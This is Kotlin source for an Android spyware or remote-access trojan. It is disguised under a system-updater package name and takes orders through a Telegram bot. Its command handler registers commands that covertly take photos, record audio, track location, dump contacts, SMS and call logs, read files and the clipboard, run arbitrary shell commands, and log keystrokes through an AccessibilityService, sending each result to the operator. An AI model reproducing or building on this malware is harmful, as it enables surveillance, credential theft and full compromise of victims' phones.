package com.android.systemui.updater

import android.content.Context
import com.android.systemui.updater.capabilities.*
import com.android.systemui.updater.capabilities.AccessibilityKeylogger

class CommandHandler(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private val registry = CommandRegistry(ctx, telegram).apply {
        // Register all commands
        register("help", "Show all commands", "❓", ::cmdHelp)
        register("ping", "Check service latency", "📡", ::cmdPing)
        register("sysinfo", "Device information", "📱", ::cmdSysInfo)
        register("location", "Location: one-time or start/stop tracking", "📍", ::cmdLocation)
        register("photo", "Take photo: /photo [front] - front camera if 'front' arg", "📸", ::cmdPhoto)
        register("audio", "Record audio: /audio <seconds> (max 60)", "🎤", ::cmdAudio)
        register("screenshot", "Capture screen (requires user consent)", "📺", ::cmdScreenshot)
        register("clipboard", "Read clipboard content", "📎", ::cmdClipboard)
        register("contacts", "Dump contacts (name, phone)", "👥", ::cmdContacts)
        register("sms", "Read SMS inbox: /sms [limit=30]", "💬", ::cmdSMS)
        register("calllog", "Read call log", "📞", ::cmdCallLog)
        register("apps", "List installed applications", "📱", ::cmdApps)
        register("launch", "Launch app: /launch <package>", "🚀", ::cmdLaunch)
        register("find", "Find files: /find <filename>", "🔍", ::cmdFind)
        register("read", "Read file text: /read <path>", "📄", ::cmdRead)
        register("list", "List directory: /list <path>", "📂", ::cmdList)
        register("storage", "Storage information", "💾", ::cmdStorage)
        register("shell", "Execute shell command: /shell <cmd>", "⚡", ::cmdShell)
        register("keylog", "Keylogger: /keylog [start/stop/dump/clear]", "⌨️", ::cmdKeylog)
        register("exfil", "Exfiltrate data via multi-channel", "📤", ::cmdExfil)
        register("admin", "Device admin activation", "🔒", ::cmdAdmin)
    }

    fun handle(input: String): Boolean {
        return registry.handle(input)
    }

    // ─────────────────────────────────────────────
    // Command implementations
    // ─────────────────────────────────────────────
    private fun cmdHelp(args: String) {
        telegram.sendText(buildString {
            appendLine("📋 Available Commands")
            appendLine("━━━━━━━━━━━━━━━━━━")
            registry.listCommands().forEach { (cmd, desc, emoji) ->
                appendLine("$emoji /$cmd — $desc")
            }
        })
    }

    private fun cmdPing(args: String) {
        val start = System.currentTimeMillis()
        telegram.sendText("📡 Pinging...")
        val roundTrip = System.currentTimeMillis() - start
        telegram.sendText("📡 Round-trip: ${roundTrip}ms")
    }

    private fun cmdSysInfo(args: String) {
        ShellCapability(ctx, telegram).sysInfo()
    }

    private fun cmdLocation(args: String) {
        val loc = LocationCapability(ctx, telegram)
        when (args.lowercase()) {
            "start" -> loc.startTracking()
            "stop" -> loc.stopTracking()
            else -> loc.getOnce()
        }
    }

    private fun cmdPhoto(args: String) {
        val front = args.contains("front", ignoreCase = true)
        CameraCapability(ctx, telegram).takePhoto(front)
    }

    private fun cmdAudio(args: String) {
        val secs = args.toIntOrNull()?.coerceIn(1, 60) ?: 10
        AudioCapability(ctx, telegram).record(secs)
    }

    private fun cmdScreenshot(args: String) {
        ScreenCapability(ctx, telegram).capture()
    }

    private fun cmdClipboard(args: String) {
        ClipboardCapability(ctx, telegram).read()
    }

    private fun cmdContacts(args: String) {
        ContactsCapability(ctx, telegram).getContacts()
    }

    private fun cmdSMS(args: String) {
        val limit = args.toIntOrNull()?.coerceIn(1, 100) ?: 30
        ContactsCapability(ctx, telegram).getSMS(limit)
    }

    private fun cmdCallLog(args: String) {
        ContactsCapability(ctx, telegram).getCallLog()
    }

    private fun cmdApps(args: String) {
        AppCapability(ctx, telegram).listInstalled()
    }

    private fun cmdLaunch(args: String) {
        if (args.isBlank()) {
            telegram.sendText("Usage: /launch <package_name>")
            return
        }
        AppCapability(ctx, telegram).launch(args.trim())
    }

    private fun cmdFind(args: String) {
        if (args.isBlank()) {
            telegram.sendText("Usage: /find <filename>")
            return
        }
        FileCapability(ctx, telegram).find(args.trim())
    }

    private fun cmdRead(args: String) {
        if (args.isBlank()) {
            telegram.sendText("Usage: /read <file_path>")
            return
        }
        FileCapability(ctx, telegram).read(args.trim())
    }

    private fun cmdList(args: String) {
        val path = if (args.isBlank()) "/sdcard" else args.trim()
        FileCapability(ctx, telegram).list(path)
    }

    private fun cmdStorage(args: String) {
        FileCapability(ctx, telegram).storageInfo()
    }

    private fun cmdShell(args: String) {
        if (args.isBlank()) {
            telegram.sendText("Usage: /shell <command>")
            return
        }
        ShellCapability(ctx, telegram).run(args)
    }

    private fun cmdKeylog(args: String) {
        when (args.lowercase().trim()) {
            "dump" -> AccessibilityKeylogger.dumpLog(ctx, telegram)
            "clear" -> AccessibilityKeylogger.clearLog(ctx, telegram)
            "start" -> telegram.sendText("⌨️ Keylogger enabled via AccessibilityService. Turn on in Settings.")
            "stop" -> telegram.sendText("⌨️ Keylogger disabled via Settings.")
            else -> telegram.sendText("⌨️ Usage: /keylog [start|stop|dump|clear]")
        }
    }

    private fun cmdExfil(args: String) {
        telegram.sendText("📤 Exfil engine ready (configured with Telegram primary)")
    }

    private fun cmdAdmin(args: String) {
        telegram.sendText("🔒 Device admin: enable via Settings → Security → Device admin")
    }
}
